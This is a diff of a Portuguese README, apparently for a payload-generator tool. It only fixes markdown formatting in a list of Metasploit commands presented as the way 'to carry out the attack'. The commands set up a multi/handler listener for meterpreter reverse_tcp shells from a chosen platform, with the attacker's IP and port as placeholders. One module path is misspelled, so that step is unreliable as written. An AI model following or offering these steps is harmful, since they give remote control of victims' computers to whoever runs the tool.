@@ -106,12 +106,12 @@ Ao concluir, será gerado um código em python que poderá ser executado em qual
 
 Para realizar o ataque em qualquer uma das plataformas acima, basta executar os comandos abaixo:
 
-1. ````msfconsole```
-2. ````use exploite/multi/handler```
-3. ````set PAYLOAD PLATAFORMA_ESCOLHIDA/meterpreter/reverse_tcp```
-4. ````set LHOST SEU_IP```
-5. ````set LPORT SUA_PORTA```
-6. ````exploit```
+1. ```msfconsole```
+2. ```use exploite/multi/handler```
+3. ```set PAYLOAD PLATAFORMA_ESCOLHIDA/meterpreter/reverse_tcp```
+4. ```set LHOST SEU_IP```
+5. ```set LPORT SUA_PORTA```
+6. ```exploit```
 
 Basta alterar em ```SUA_PLATAFORMA``` para a plataforma da qual você executará a ação e difinir o seu ip e a mesma porta que foi escolhida na hora de criar o payload.
 
